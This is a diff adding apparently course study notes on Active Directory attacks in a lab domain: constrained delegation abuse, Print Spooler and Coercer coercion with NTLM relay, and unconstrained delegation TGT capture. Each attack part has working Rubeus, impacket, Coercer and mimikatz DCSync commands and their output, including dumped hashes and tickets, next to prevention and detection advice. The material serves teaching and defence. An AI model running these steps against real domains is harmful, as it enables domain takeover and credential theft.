@@ -595,3 +595,807 @@ If `SID filtering` is enabled, we will get alerts with the event ID `4675` durin
 ## Note
 
 If an Active Directory forest has been compromised, we need to reset all users' passwords and revoke all certificates, and for `krbtgt`, we must reset its password twice (in `every domain`). The password history value for the `krbtgt` account is 2. Therefore it stores the two most recent passwords. By resetting the password twice, we effectively clear any old passwords from the history, so there is no way another DC will replicate this DC by using an old password. However, it is recommended that this password reset occur at least 10 hours apart from each other (maximum user ticket lifetime); otherwise, expect some services to break if done in a shorter period.
+
+# Kerberos Constrained Delegation
+
+`Kerberos Delegation` enables an application to access resources hosted on a different server; for example, instead of giving the service account running the web server access to the database directly, we can allow the account to be delegated to the SQL server service. Once a user logs into the website, the web server service account will request access to the SQL server service on behalf of that user, allowing the user to get access to the content in the database that they’ve been provisioned to without having to assign any access to the web server service account itself.
+
+We can configure three types of delegations in Active Directory:
+
+- `Unconstrained Delegation` (most permissive/broad)
+- `Constrained Delegation`
+- `Resource-based Delegation`
+
+Knowing and understanding that `any` type of delegation is a possible security risk is paramount, and we should avoid it unless necessary.
+
+As the name suggests, `unconstrained delegation` is the most permissive, allowing an account to delegate to any service. In `constrained delegation`, a user account will have its properties configured to specify which service(s) they can delegate. For r`esource-based delegation`, the configuration is within the computer object to whom delegation occurs. In that case, the computer is configured as `I trust only this/these accounts`. It is rare to see `Resource-based delegation` configured by an Administrator in production environments ( threat agents often abuse it to compromise devices). However, `Unconstrained` and `Constrained` delegations are commonly encountered in production environments.
+
+## The Attack
+
+We will only showcase the abuse of `constrained delegation`; when an account is trusted for delegation, the account sends a request to the `KDC` stating, "Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ", and a Kerberos ticket is generated for user YYYY (without supplying the password of user YYYY). It is also possible to delegate to another service, even if not configured in the user properties. For example, if we are trusted to delegate for `LDAP`, we can perform protocol transition and be entrusted to any other service such as `CIFS` or `HTTP`.
+
+To demonstrate the attack, we assume that the user `web_service` is trusted for delegation and has been compromised. To begin, we will use the `Get-NetUser` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (`PowerCiew-main.ps1`) to enumerate user accounts that are trusted for constrained delegation in the domain:
+
+```PowerShell
+PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth
+
+logoncount                    : 23
+badpasswordtime               : 12/31/1601 4:00:00 PM
+distinguishedname             : CN=web service,CN=Users,DC=eagle,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+displayname                   : web service
+lastlogontimestamp            : 10/13/2022 2:12:22 PM
+userprincipalname             : webservice@eagle.local
+name                          : web service
+objectsid                     : S-1-5-21-1518138621-4282902758-752445584-2110
+samaccountname                : webservice # will use this fro Robeus
+codepage                      : 0
+samaccounttype                : USER_OBJECT
+accountexpires                : NEVER
+countrycode                   : 0
+whenchanged                   : 10/13/2022 9:53:09 PM
+instancetype                  : 4
+usncreated                    : 135866
+objectguid                    : b89f0cea-4c1a-4e92-ac42-f70b5ec432ff
+lastlogoff                    : 1/1/1600 12:00:00 AM
+msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1, http/DC1.eagle.local/EAGLE...} #and this tells us what `service/where` it has delegation power to
+objectcategory                : CN=Person,CN=Schema, CN=Configuration,DC=eagle,DC=local
+dscorepropagationdata         : 1/1/1601 12:00:00 AM
+serviceprincipalname          : {cvs/dc1.eagle.local, cvs/dc1}
+givenname                     : web service
+lastlogon                     : 10/14/2022 2:31:39 PM
+badpwdcount                   : 0
+cn                            : web service
+useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+whencreated                   : 10/13/2022 8:32:35 PM
+primarygroupid                : 513
+pwdlastset                    : 10/13/2022 10:36:04 PM
+msds-supportedencryptiontypes : 0
+usnchanged                    : 143463
+```
+
+We can see that the user `web_service` is configured for delegating the HTTP service to the Domain Controller `DC1`. The HTTP service provides the ability to execute `PowerShell Remoting`. Therefore, any threat actor gaining control over `web_service` can request a Kerberos ticket for any user in Active Directory and use it to connect to `DC1` over `PowerShell Remoting`.
+
+Before we request a ticket with `Rubeus` (which expects a password hash instead of cleartext for the `/rc4` argument used subsequently), we need to use it to convert the plaintext password we compromised before this attack into its `NTLM` hash equivalent:
+```PowerShell
+PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:compromised_password
+```
+
+Then, we will use `Rubeus` to get a ticket for the `Administrator` account (arbitrary?):
+
+```PowerShell
+PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:password_NTLM_hash /domain:ADdomain.fqdn /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:path.we.got.from.allowedtodelegateto /ptt
+
+...
+[+] TGT request successful!
+...
+[+] Ticket successfully imported!
+...
+```
+
+We're using `/ptt` to impersonate `Administrator` in our session.
+
+we can again verify our identity with `klist`.
+
+With the ticket being available, we can connect to the Domain Controller impersonating the account `Administrator`:
+```PowerShell
+PS C:\Users\bob\Downloads> Enter-PSSession dc1
+[dc1]: PS C:\Users\Administrator\Documents> hostname
+DC1
+[dc1]: PS C:\Users\Administrator\Documents> whoami
+eagle\administrator
+[dc1]: PS C:\Users\Administrator\Documents>
+```
+
+If the last step fails (we may need to do `klist purge`, obtain new tickets, and try again by rebooting the machine). We can also request tickets for multiple services with the `/altservice` argument, such as `LDAP`, `CFIS`, `time`, and `host`.
+
+## Prevention
+
+Fortunately, when designing Kerberos Delegation, Microsoft implemented several protection mechanisms; however, it did not enable them by default to any user account. There are two direct ways to prevent a ticket from being issued for a user via delegation:
+
+- Configure the property `Account is sensitive and cannot be delegated` for all privileged users.
+- Add privileged users to the `Protected Users` group: this membership automatically applies the protection mentioned above (however, it is not recommended to use `Protected Users` without first understanding its potential implications).
+
+We should treat any account configured for delegation as extremely privileged, regardless of its actual privileges (such as being only a Domain user). Cryptographically secure passwords are a must, as we don't want `Kerberoasting` giving threat agents an account with delegation privileges.
+
+## Detection
+
+Correlating users' behavior is the best technique to detect `constrained delegation` abuse. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account 'Administrator' in the attack described above. If a mature organization uses `Privileged Access Workstations` (`PAWs`), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID `4624` (successful logon).
+
+In some occasions, a successful logon attempt with a delegated ticket will contain information about the ticket's issuer under the `Transited Services` attribute in the events log. This attribute is normally populated if the logon resulted from an `S4U` (`Service For User`) logon process.
+
+`S4U` is a Microsoft extension to the Kerberos protocol that allows an application service to obtain a Kerberos service ticket on behalf of a user; if we recall from the attack flow when utilizing `Rubeus`, we specified this `S4U` extension.
+
+# Printer Spooler & NTLM Relaying
+
+The [Print Spooler](https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler) is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, `Lee Christensen` found the `PrinterBug`. The functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a `TGT`. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine. Microsoft's stance on the `PrinterBug` was that it will not be fixed, as the issue is "by-design".
+
+The impact of `PrinterBug` is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:
+
+1. Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
+2. Force `Domain Controller` to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the `TGT` in the memory of the `UD server`, which can be captured/exported with tools like Rubeus and Mimikatz.
+3. Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the `Domain Controller`. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+4. Relay the connection to configure `Resource-Based Kerberos Delegation` for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
+
+## The Attack
+
+In this attack path, we will relay the connection to another DC and perform `DCSync` (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.
+
+To begin, we will configure `NTLMRelayx` to forward any connections to DC2 and attempt to perform the DCSync attack:
+```bash
+$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections # <--
+```
+
+Next, we need to trigger the `PrinterBug` using the Kali box with `NTLMRelayx` listening. To trigger the connection back, we'll use [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):
+```bash
+python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+
+[*] connecting to 172.16.18.3
+[*] bound to spoolss
+[*] getting context handle...
+[*] sending RFFPCNEX...
+[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
+[*] done!
+```
+
+Now, switching back to the terminal session with `NTLMRelayx`, we will see that `DCSync` was successful the password hashes successfully extracted (eg, krbtgt, Administrator..).
+
+## Prevention
+
+Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.
+
+Additionally, there is an option to prevent the abuse of the `PrinterBug` while keeping the service running: when disabling the registry key `RegisterSpoolerRemoteRpcEndPoint`, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it.
+
+## Detection
+
+Exploiting the `PrinterBug` will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.
+
+In the case of using `NTLMRelayx` to perform DCSync, no event ID `4662` is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller.
+
+A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).
+
+## Honeypot
+
+It is possible to use the `PrinterBug` as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports `139` and `445`; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).
+
+While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.
+
+# Coercing Attacks & Unconstrained Delegation
+
+Incredibly similar to `Print Spooler & STLM Relaying` section right before.
+
+Coercing attacks have become a `one-stop shop` for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the `PrinterBug`. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine in the domain. Eventually, the [Coercer](https://github.com/p0dalirius/Coercer) tool was developed to exploit all known vulnerable RPC functions simultaneously.
+
+Similar to the `PrinterBug`, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:
+
+- Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
+- Force the Domain Controller to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like `Rubeus` and `Mimikatz`.
+- Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
+- Relay the connection to configure `Resource-Based Kerberos Delegation` for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
+
+
+## The Attack
+
+We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for `Unconstrained Delegation`. We will use this server to capture the TGT, while `Coercer` will be executed from the Kali machine.
+
+To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch:
+```PowerShell
+PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
+
+samaccountname
+--------------
+DC1$
+SERVER01$ # <---
+WS001$ # <---
+DC2$
+```
+
+`WS001` and `SERVER01` are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs:
+```PowerShell
+PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 1 seconds for new TGTs
+
+
+[*] 18/12/2022 22.37.09 UTC - Found new TGT:
+
+  User                  :  bob@EAGLE.LOCAL
+  StartTime             :  18/12/2022 23.30.09
+  EndTime               :  19/12/2022 09.30.09
+  RenewTill             :  25/12/2022 23.30.09
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+doIE2jCCBNagAwIBBaEDAgEWooID5zCCA+NhggPfMIID26ADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0
+GwtFQUdMRS5MT0NBTKOCA6EwggOdoAMCARKhAwIBAqKCA48EggOLxoWz+JE4JEP9VvNlDvGKzqQ1BjjpjjO03haKFPPeszM4Phkb    QQBPfixBqQ3bthdsizmx3hdjNzFVKnUOK2h2CDFPeUia+0rCn1FllimXQwdEFMri7whC2qA4/vy52Y2jJdmkR7ZIRAeU5Yfm373L
+iEHgnX4PCA94Ck/BEwUY0bk6VAWkM2FSPgnuiCeQQ4yJMPa3DK6MHYJ/1kZy+VqxwSqov/tVhATshel1vXpr4rz03ofgNtwLDYb+    K5AGYSbSct5w1jTWtGAicCCr1vpcUguIWH0Nh1lQ+tZccVtEtsrjZ/jwCKsadQWIFwhPOnVpf5drUlav1iCXmxWqQr5glW/IOOE1
+lHsBolieGSyY20ZHBYjXflCGkO13mRwqO3rQ5KMs8HrC3Aqu7Popaw29at0vzZLinYnWnHUn01hh5e3QyIkqIH3CBvaPbl3RukZ7    jZRBm6BVF7R5KEWp+6Gg2joP6WvXDBCIzqL3jmxQ8NVoeeidgnBuZKpYL45E8jJjxbW4t9D8EdlX9Xu+fj/Fazw08HtRkzwG30vE
+	<SNIP>
+	<SNIP>
+	<SNIP>
+	
+[*] Ticket cache size: 4
+```
+
+Next, we need to know the IP address of WS001, which we can be obtain by running `ipconfig`. Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful:
+
+```bash
+jucapik42@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[dc1.eagle.local] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to ws001.eagle.local ...
+   [>] Pipe '\PIPE\lsarpc' is accessible!
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
+      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
+   [>] Pipe '\PIPE\netdfs' is accessible!
+      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsAddStdRoot' (opnum 12) ... rpc_s_access_denied (Attack should have worked!)
+      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...    [>] Pipe '\PIPE\spoolss' is accessible!
+      [>] On 'dc1.eagle.local' through '\PIPE\spoolss' targeting 'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)
+
+[+] All done!
+```
+
+Now, if we switch to WS001 and look at the continuous output that `Rubeus` provide, there should be a TGT for DC1 available:
+```PowerShell
+[*] 18/12/2022 22.55.52 UTC - Found new TGT:
+
+  User                  :  DC1$@EAGLE.LOCAL # <-------
+  StartTime             :  18/12/2022 23.30.21
+  EndTime               :  19/12/2022 09.30.21
+  RenewTill             :  24/12/2022 09.28.39
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+doIFdDCCBXCgAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0    GwtFQUdMRS5MT0NBTKOCBDowggQ2oAMCARKhAwIBAqKCBCgEggQkv8ILT9IdJgNgjxbddnICsd5quqFnXS7m7YwJIM/lcwLy4SHI
+i1iWbvsTiu078mz28R0sn7Mxvg2oVC7NTw+b2unvmQ3utRLTgaz02WYnGWSBu7gxs+Il/0ekW5ZSX3ESq0AGwPaqUcuWSFDNNfOM
+ws/8MlkJeFSFWeHwJL7FbzuCjZ2x/6UUl2IOYq0Ozaf3R+rDJQ6LqpDVAet53IoHDugduBfZoDHTZFntRAoYrmAWdcnFdUEpyZGH    Kj6i2M0TyrxUp3nq022BNB6v+sHgH3SWsMNiba+TYaeRdjiM2nVjhGZTXDuro9rLkYFk1HPXuI/d0RfzVuq9Hh5hVCZRwcM3V2BN
+eYRTMeW+lvz1bBgdgK/wlYMS7J99F1V/r6K8zdO7pQ0Zj216DfA42QINPswVL+89gy7PLLm5aYlw8nlbBdvTZrPbeOhtvdBy/pFB    fxrjHA+fW34/Yk+9k6oSPXCaCQ/Rd1qZ/P57/0MDUYRlDs5EYOOxxGQPVFbOqhbG414vGRbi39ALj/MkYG629kCEb9K89p5teo6f
+7w/4M6Ytun16sG3GxsWDG6dlZP+fmmOr0nwdXgvT28NQxQ3EEMErX+BojUY6DdRBH2u3fcv1KOA5K7MDma+cVLaa0YjSYZ2IDRaC    0JcgcUexd6EfQPtSnikaA/zzYmu/PSYVXlcg7cFULJIiPuN4f9VlDlVOqj8C3xCwtYo4zRklLESUES9tGK/VfsmN0Q/Fx5ULIa7y
+UND/d1HlQ+R6Fnh2GGUPk+LlVw+ScD0kf2nmmlsIwhnGmscpiFs1lprX35Khlx/y5+v9S7bdokZujPpyZactQ4wdfRK++bOWo2ao    Ewrzjuq199JnTQHbxkqGgeKQedOPxOhDccQLYTm44wH73JuE+XoGKmdGbgXfjSBFlTinP9mvZA12NkQupnGYVzJ2rS1T0nf2VVUW
+MfIgh8Nz4xYvDHV1iIV4ZrLI7u7ZwJtrlESgO0H0d/k6CpLxo5L7kzhkU+MJggdUFJvS3HskTxZmewEwSdKJn21YfAG1Q6X0nFqk
+HdK3RUvxXcycwMvWdfYH2AW06+98q5h+TSJQrMcrp9gT+khLPD4KL2n6+cvC3BVHqge5Nc16LhW7kcNp+JcIzknwAsCZlaXzhz3X
+K78ooLfZGaKGoNnDWLUQpYToVgXXSO53HJ3Vgl0MwctV7l+gJdwMtac0VVhH8EAndeSPnEcNOX8mr/30k+9GwM1wtFQNFB03CdoA    qRJBjyFw1h1KKuc61PTWuxVLwGmezshekwoSLOJ7V9G9qNpVQl0AgtTK2SHeobItuD4rhDc3/0jJ4LzsXJieYbLK7dtVfxYtSbeu
+ZqXhd7HcSq5SN4LOmEP1tScir+shxQC+hbs3oYx/rHfj8GDDEZ8UwY6I4JF4pQsApKOB3zCB3KADAgEAooHUBIHRfYHOMIHLoIHI    MIHFMIHCoCswKaADAgESoSIEIDs9gBc+2myj4I7mPmXH542vha3A2zfkHbm/RxnK4oMSoQ0bC0VBR0xFLkxPQ0FMohEwD6ADAgEB
+oQgwBhsEREMxJKMHAwUAYKEAAKURGA8yMDIyMTIxODIyMzAyMVqmERgPMjAyMjEyMTkwODMwMjFapxEYDzIwMjIxMjI0MDgyODM5
+WqgNGwtFQUdMRS5MT0NBTKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRUFHTEUuTE9DQUw=
+
+[*] Ticket cache size: 5
+```
+
+We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).
+
+One way of using the abovementioned TGT is through Rubeus, as follows.
+```PowerShell
+PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+PS C:\Users\bob\Downloads> klist
+
+Current LogonId is 0:0x101394
+
+Cached Tickets: (1)
+
+#0>     Client: DC1$ @ EAGLE.LOCAL
+        Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 4/21/2023 8:54:04 (local)
+        End Time:   4/21/2023 18:54:04 (local)
+        Renew Time: 4/28/2023 8:54:04 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
+```PowerShell
+PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:eagle.local /user:Administrator
+[DC] 'eagle.local' will be the domain
+[DC] 'DC1.eagle.local' will be the DC server
+[DC] 'Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 01/01/1601 02.00.00
+Password last change : 07/08/2022 21.24.13
+Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6fd69313922373216cdbbfa823bd268d
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-FM93RI8QOKQAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
+      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
+      des_cbc_md5       (4096) : d9b53b1f6d7c45a8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-FM93RI8QOKQAdministrator
+    Credentials
+      des_cbc_md5       : d9b53b1f6d7c45a8
+
+
+mimikatz # exit
+Bye!
+```
+
+## Prevention
+
+Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:
+
+1. Implementing a third-party RPC firewall, such as the one from [zero networks](https://github.com/zeronetworks/rpcfirewall), and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous `OPNUM` associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
+2. Block Domain Controllers and other core infrastructure servers from connecting to outbound ports `139` and `445`, `except` to machines that are required for AD (as well for business operations). One example is that while we `block general outbound traffic` to ports `139` and `445`, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)
+
+## Detection
+
+As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.
+
+A successful coercing attack with Coercer will result in the following host firewall log, where the machine at .128 is the attacker machine and the .200 is the Domain Controller.
+
+[pfirewall network log](./Coercer-FirewallLogs.webp)
+
+We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.
+
+If we go forward and block outbound traffic to port 445, then we will observe the following behavior:
+
+[139 and 445 protection](./Coercer-FirewallLogsBlockOutbound139n445.webp)
+
+Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports `139` and `445` is recommended.
+
+The above can also be used for detection, as any unexpected dropped traffic to ports `139` or `445` is suspicious.
+
+# Object ACLs
+
+TLDR: Bloodhound and Sharphound
+
+In Active Directory, [Access Control Lists (ACLs)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) are tables, or simple lists, that define the trustees who have access to a specific object and their access type. A trustee may be any security principal, such as a user account, group, or login session. Each `access control list` has a set of `access control entries` (`ACE`), and each ACE defines the trustee and the type of access the trustee has. Therefore, an object can be accessed by multiple trustees since there can be various ACEs. Access control lists are also used for auditing purposes, such as recording the number of access attempts to a securable object and the type of access. A securable object is any named object in Active Directory that contains a security descriptor, which has the security information about the object, which includes ACLs.
+
+An example of an `Access Control Entry` is that, by default, AD gives Domain Admins the right to modify the password of every object. However, rights can also be delegated to certain users or groups that can perform a specific action on other objects; this can be password resets, modification of group membership, or deletion of objects. In large organizations, if it is virtually impossible to avoid non-privileged users ending up with delegated rights, they should eliminate human error and have well-defined process documentation. For example, suppose an employee was to (accidentally/intentionally) change their department from IT to Security Operations. In that case, the organization must have a process to revoke all rights and access to systems and applications. In real-life AD environments, we will often encounter cases such as:
+
+- All Domain users added as Administrators to all Servers
+- Everyone can modify all objects (having full rights to them).
+- All Domain users have access to the computer's extended properties containing the LAPS passwords.
+
+## The Attack
+
+To identify potential abusable ACLs, we will use [BloodHound](https://github.com/BloodHoundAD/BloodHound) to graph the relationships between the objects and [SharpHound](https://github.com/BloodHoundAD/SharpHound) to scan the environment and pass All to the -c parameter (short version of CollectionMethod):
+```PowerShell
+PS C:\Users\bob\Downloads> .\SharpHound.exe -c All
+
